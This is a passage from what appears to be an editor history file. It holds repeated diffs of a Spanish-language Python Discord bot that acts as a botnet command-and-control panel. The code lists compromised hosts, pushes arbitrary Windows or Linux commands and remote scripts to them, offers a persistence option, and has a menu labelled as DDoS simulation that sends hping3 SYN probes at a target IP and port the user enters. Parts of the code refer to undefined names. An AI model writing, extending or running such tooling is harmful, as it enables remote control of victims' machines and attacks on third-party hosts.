{e}\")\r\n+                        return\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+        else:\r\n+            await ctx.send(\"Opción no válida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el menú de comandos: {e}\")\r\n+        await ctx.send(\"Error en el menú de comandos.\")\r\n+\r\n+@bot.command(name='ayuda')\r\n+async def ayuda_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar la ayuda del bot.\r\n+    \"\"\"\r\n+    help_text = \"\"\"\r\n+    **Comandos disponibles:**\r\n+\r\n+    **!listar_bots**\r\n+    - Lista los bots conectados al servidor.\r\n+\r\n+    **!enviar_comando <comando_windows> <comando_linux>**\r\n+    - Envía un comando a los bots conectados.\r\n+    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n+\r\n+    **!cerrar_conexion <bot_id>**\r\n+    - Cierra la conexión con un bot específico.\r\n+    - Ejemplo: `!cerrar_conexion 1`\r\n+\r\n+    **!menu_comandos**\r\n+    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n+\r\n+    **!ayuda**\r\n+    - Muestra este mensaje de ayuda.\r\n+    \"\"\"\r\n+    await ctx.send(help_text)\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740254211206,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -2,8 +2,12 @@\n from discord.ext import commands\r\n import logging\r\n import configparser\r\n import os\r\n+import socket\r\n+import subprocess\r\n+import threading\r\n+import time\r\n \r\n # Cargar configuración\r\n config = configparser.ConfigParser()\r\n config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n@@ -11,8 +15,14 @@\n intents = discord.Intents.default()\r\n intents.message_content = True\r\n bot = commands.Bot(command_prefix='!', intents=intents)\r\n \r\n+# Variables globales\r\n+bots = []  # Lista de bots conectados\r\n+bot_ids = {}  # Diccionario con los IDs de los bots\r\n+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n+respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots\r\n+\r\n @bot.event\r\n async def on_ready():\r\n     logging.info(f'Bot conectado como {bot.user}')\r\n     print(f'Bot conectado como {bot.user}')\r\n@@ -233,5 +243,175 @@\n \r\n     **!ayuda**\r\n     - Muestra este mensaje de ayuda.\r\n     \"\"\"\r\n-    await ctx.send(help_text)\n\\ No newline at end of file\n+    await ctx.send(help_text)\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Enviando comando a los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione a qué bots enviar el comando:\")\r\n+        print(\"1. Todos los bots\")\r\n+        print(\"2. Solo bots Windows\")\r\n+        print(\"3. Solo bots Linux\")\r\n+        print(\"4. Un bot específico\")\r\n+        print(\"5. Lista de bots específicos\")\r\n+\r\n+        seleccion = input(\"Ingrese su opción: \")\r\n+        bots_seleccionados = []\r\n+\r\n+        if seleccion == \"1\":\r\n+            bots_seleccionados = bots\r\n+        elif seleccion == \"2\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n+        elif seleccion == \"3\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n+        elif seleccion == \"4\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n+                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n+                if bot:\r\n+                    bots_seleccionados.append(bot)\r\n+                else:\r\n+                    print(\"ID de bot no válido.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"ID inválido. Debe ingresar un número.\")\r\n+                return\r\n+        elif seleccion == \"5\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n+                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n+                if not bots_seleccionados:\r\n+                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"Entrada inválida. Debe ingresar números separados por comas.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opción no válida.\")\r\n+            return\r\n+\r\n+        respuestas = {}\r\n+\r\n+        for bot in bots_seleccionados:\r\n+            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n+\r\n+        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n+        for bot, respuesta in respuestas.items():\r\n+            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n+            print(f\"[→] {bot_info}: {respuesta}\")\r\n+\r\n+        print(\"\\n--- Volviendo al menú principal ---\\n\")\r\n+        time.sleep(2)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un bot específico basado en su sistema operativo.\r\n+\r\n+    Determina el sistema operativo del bot y envía el comando adecuado \r\n+    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n+    máximo definido y devuelve la respuesta si se recibe. Maneja la \r\n+    desconexión del bot si ocurre durante la comunicación.\r\n+\r\n+    :param bot: El socket del bot al que se enviará el comando.\r\n+    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n+    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n+             respuesta o si el bot se desconecta.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n+        so = sistemas_operativos.get(bot, \"desconocido\")\r\n+        comando = comando_windows if so == \"windows\" else comando_linux\r\n+        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n+\r\n+        try:\r\n+            bot.send(comando.encode('utf-8'))\r\n+            print(f\"\\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n+\r\n+            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n+            tiempo_maximo = 5  # Segundos\r\n+            tiempo_inicial = time.time()\r\n+\r\n+            while time.time() - tiempo_inicial < tiempo_maximo:\r\n+                if bot_id in respuestas_bots:\r\n+                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n+                    if tipo_comando == \"ddos_start\":\r\n+                        ddos_status[bot_id] = \"running\"\r\n+                    elif tipo_comando == \"ddos_stop\":\r\n+                        ddos_status[bot_id] = \"stopped\"\r\n+                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n+                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n+                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n+\r\n+            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n+\r\n+        except (socket.error, BrokenPipeError):\r\n+            print(f\"[✗] Bot {bot_id} desconectado.\")\r\n+            if bot in bots:\r\n+                bots.remove(bot)\r\n+            if bot in bot_ids:\r\n+                del bot_ids[bot]\r\n+            if bot in sistemas_operativos:\r\n+                del sistemas_operativos[bot]\r\n+            return \"[ERROR] El bot se ha desconectado.\"\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n+\r\n+def cerrar_conexion_bots(bot_id):\r\n+    \"\"\"\r\n+    Cierra la conexión con un bot seleccionado por el usuario.\r\n+    \r\n+    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión\r\n+    mediante un ID o bien escribir \"todos\" para cerrar la conexión con todos\r\n+    los bots conectados.\r\n+    \r\n+    :param bot_id: El ID del bot cuya conexión se desea cerrar.\r\n+    :type bot_id: int\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cerrando conexión con los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)  # Buscar el bot con el ID correspondiente\r\n+        \r\n+        if not bot:  # Si no se encuentra el bot\r\n+            print(f\"ID de bot {bot_id} no válido.\")  # Imprimir un mensaje de error\r\n+            return\r\n+\r\n+        try:\r\n+            bot.close()  # Cerrar la conexión\r\n+            print(f\"Conexión con el bot {bot_id} cerrada.\")  # Imprimir un mensaje de confirmación\r\n+        except Exception as e:\r\n+            print(f\"Error al cerrar la conexión con el bot {bot_id}: {e}\")\r\n+\r\n+        if bot in bots:\r\n+            bots.remove(bot)  # Eliminar el bot de la lista\r\n+\r\n+        if bot in bot_ids:\r\n+            del bot_ids[bot]  # Eliminar el ID del bot\r\n+\r\n+        if bot in sistemas_operativos:\r\n+            del sistemas_operativos[bot]  # Eliminar el SO del bot\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740254220729,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,417 @@\n+import discord\r\n+from discord.ext import commands\r\n+import logging\r\n+import configparser\r\n+import os\r\n+import socket\r\n+import subprocess\r\n+import threading\r\n+import time\r\n+\r\n+# Cargar configuración\r\n+config = configparser.ConfigParser()\r\n+config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n+\r\n+intents = discord.Intents.default()\r\n+intents.message_content = True\r\n+bot = commands.Bot(command_prefix='!', intents=intents)\r\n+\r\n+# Variables globales\r\n+bots = []  # Lista de bots conectados\r\n+bot_ids = {}  # Diccionario con los IDs de los bots\r\n+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n+respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots\r\n+\r\n+@bot.event\r\n+async def on_ready():\r\n+    logging.info(f'Bot conectado como {bot.user}')\r\n+    print(f'Bot conectado como {bot.user}')\r\n+\r\n+@bot.command(name='listar_bots')\r\n+async def listar_bots_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para listar los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        if bots:\r\n+            response = \"\\nBots conectados:\\n\"\r\n+            for bot_conn in bots:\r\n+                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n+                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n+        else:\r\n+            response = \"No hay bots conectados.\"\r\n+        await ctx.send(response)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+        await ctx.send(\"Error al listar bots.\")\r\n+\r\n+@bot.command(name='enviar_comando')\r\n+async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n+    \"\"\"\r\n+    Comando de Discord para enviar un comando a los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        enviar_comando(comando_windows, comando_linux)\r\n+        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+        await ctx.send(\"Error al enviar comando.\")\r\n+\r\n+@bot.command(name='cerrar_conexion')\r\n+async def cerrar_conexion_command(ctx, bot_id: int):\r\n+    \"\"\"\r\n+    Comando de Discord para cerrar la conexión con un bot específico.\r\n+    \"\"\"\r\n+    try:\r\n+        cerrar_conexion_bots(bot_id)\r\n+        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n+        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n+\r\n+@bot.command(name='menu_comandos')\r\n+async def menu_comandos_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar el menú de comandos.\r\n+    \"\"\"\r\n+    try:\r\n+        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n+        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+        tipo_comando = tipo_comando.content.strip()\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n+                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                objetivo = objetivo.content.strip()\r\n+                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n+                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                puerto = puerto.content.strip()\r\n+                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n+                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                protocolo = protocolo.content.strip().upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    await ctx.send(\"Protocolo no válido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n+                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_windows = comando_windows.content.strip()\r\n+                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n+                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_linux = comando_linux.content.strip()\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n+                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                tipo = tipo.content.strip()\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n+                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    extension = extension.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n+                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_linux = interprete_linux.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n+                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_windows = interprete_windows.content.strip()\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n+                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                metodo = metodo.content.strip()\r\n+\r\n+                if metodo == \"1\":\r\n+                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                        linea = linea.content.strip()\r\n+                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n+                            break\r\n+                        lineas.append(linea)\r\n+                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n+                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    ruta = ruta.content.strip()\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+        else:\r\n+            await ctx.send(\"Opción no válida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el menú de comandos: {e}\")\r\n+        await ctx.send(\"Error en el menú de comandos.\")\r\n+\r\n+@bot.command(name='ayuda')\r\n+async def ayuda_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar la ayuda del bot.\r\n+    \"\"\"\r\n+    help_text = \"\"\"\r\n+    **Comandos disponibles:**\r\n+\r\n+    **!listar_bots**\r\n+    - Lista los bots conectados al servidor.\r\n+\r\n+    **!enviar_comando <comando_windows> <comando_linux>**\r\n+    - Envía un comando a los bots conectados.\r\n+    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n+\r\n+    **!cerrar_conexion <bot_id>**\r\n+    - Cierra la conexión con un bot específico.\r\n+    - Ejemplo: `!cerrar_conexion 1`\r\n+\r\n+    **!menu_comandos**\r\n+    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n+\r\n+    **!ayuda**\r\n+    - Muestra este mensaje de ayuda.\r\n+    \"\"\"\r\n+    await ctx.send(help_text)\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Enviando comando a los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione a qué bots enviar el comando:\")\r\n+        print(\"1. Todos los bots\")\r\n+        print(\"2. Solo bots Windows\")\r\n+        print(\"3. Solo bots Linux\")\r\n+        print(\"4. Un bot específico\")\r\n+        print(\"5. Lista de bots específicos\")\r\n+\r\n+        seleccion = input(\"Ingrese su opción: \")\r\n+        bots_seleccionados = []\r\n+\r\n+        if seleccion == \"1\":\r\n+            bots_seleccionados = bots\r\n+        elif seleccion == \"2\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n+        elif seleccion == \"3\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n+        elif seleccion == \"4\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n+                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n+                if bot:\r\n+                    bots_seleccionados.append(bot)\r\n+                else:\r\n+                    print(\"ID de bot no válido.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"ID inválido. Debe ingresar un número.\")\r\n+                return\r\n+        elif seleccion == \"5\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n+                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n+                if not bots_seleccionados:\r\n+                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"Entrada inválida. Debe ingresar números separados por comas.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opción no válida.\")\r\n+            return\r\n+\r\n+        respuestas = {}\r\n+\r\n+        for bot in bots_seleccionados:\r\n+            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n+\r\n+        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n+        for bot, respuesta in respuestas.items():\r\n+            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n+            print(f\"[→] {bot_info}: {respuesta}\")\r\n+\r\n+        print(\"\\n--- Volviendo al menú principal ---\\n\")\r\n+        time.sleep(2)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un bot específico basado en su sistema operativo.\r\n+\r\n+    Determina el sistema operativo del bot y envía el comando adecuado \r\n+    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n+    máximo definido y devuelve la respuesta si se recibe. Maneja la \r\n+    desconexión del bot si ocurre durante la comunicación.\r\n+\r\n+    :param bot: El socket del bot al que se enviará el comando.\r\n+    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n+    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n+             respuesta o si el bot se desconecta.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n+        so = sistemas_operativos.get(bot, \"desconocido\")\r\n+        comando = comando_windows if so == \"windows\" else comando_linux\r\n+        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n+\r\n+        try:\r\n+            bot.send(comando.encode('utf-8'))\r\n+            print(f\"\\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n+\r\n+            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n+            tiempo_maximo = 5  # Segundos\r\n+            tiempo_inicial = time.time()\r\n+\r\n+            while time.time() - tiempo_inicial < tiempo_maximo:\r\n+                if bot_id in respuestas_bots:\r\n+                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n+                    if tipo_comando == \"ddos_start\":\r\n+                        ddos_status[bot_id] = \"running\"\r\n+                    elif tipo_comando == \"ddos_stop\":\r\n+                        ddos_status[bot_id] = \"stopped\"\r\n+                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n+                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n+                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n+\r\n+            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n+\r\n+        except (socket.error, BrokenPipeError):\r\n+            print(f\"[✗] Bot {bot_id} desconectado.\")\r\n+            if bot in bots:\r\n+                bots.remove(bot)\r\n+            if bot in bot_ids:\r\n+                del bot_ids[bot]\r\n+            if bot in sistemas_operativos:\r\n+                del sistemas_operativos[bot]\r\n+            return \"[ERROR] El bot se ha desconectado.\"\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n+\r\n+def cerrar_conexion_bots(bot_id):\r\n+    \"\"\"\r\n+    Cierra la conexión con un bot seleccionado por el usuario.\r\n+    \r\n+    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión\r\n+    mediante un ID o bien escribir \"todos\" para cerrar la conexión con todos\r\n+    los bots conectados.\r\n+    \r\n+    :param bot_id: El ID del bot cuya conexión se desea cerrar.\r\n+    :type bot_id: int\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cerrando conexión con los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)  # Buscar el bot con el ID correspondiente\r\n+        \r\n+        if not bot:  # Si no se encuentra el bot\r\n+            print(f\"ID de bot {bot_id} no válido.\")  # Imprimir un mensaje de error\r\n+            return\r\n+\r\n+        try:\r\n+            bot.close()  # Cerrar la conexión\r\n+            print(f\"Conexión con el bot {bot_id} cerrada.\")  # Imprimir un mensaje de confirmación\r\n+        except Exception as e:\r\n+            print(f\"Error al cerrar la conexión con el bot {bot_id}: {e}\")\r\n+\r\n+        if bot in bots:\r\n+            bots.remove(bot)  # Eliminar el bot de la lista\r\n+\r\n+        if bot in bot_ids:\r\n+            del bot_ids[bot]  # Eliminar el ID del bot\r\n+\r\n+        if bot in sistemas_operativos:\r\n+            del sistemas_operativos[bot]  # Eliminar el SO del bot\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740254319678,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,419 @@\n+import discord\r\n+from discord.ext import commands\r\n+import logging\r\n+import configparser\r\n+import os\r\n+import socket\r\n+import subprocess\r\n+import threading\r\n+import time\r\n+\r\n+# Cargar configuración\r\n+config = configparser.ConfigParser()\r\n+config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n+\r\n+intents = discord.Intents.default()\r\n+intents.message_content = True\r\n+bot = commands.Bot(command_prefix='!', intents=intents)\r\n+\r\n+# Variables globales\r\n+bots = []  # Lista de bots conectados\r\n+bot_ids = {}  # Diccionario con los IDs de los bots\r\n+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n+respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots\r\n+\r\n+@bot.event\r\n+async def on_ready():\r\n+    logging.info(f'Bot conectado como {bot.user}')\r\n+    print(f'Bot conectado como {bot.user}')\r\n+\r\n+@bot.command(name='listar_bots')\r\n+async def listar_bots_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para listar los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        if bots:\r\n+            response = \"\\nBots conectados:\\n\"\r\n+            for bot_conn in bots:\r\n+                so = sistemas_operativos.get(bot_conn, 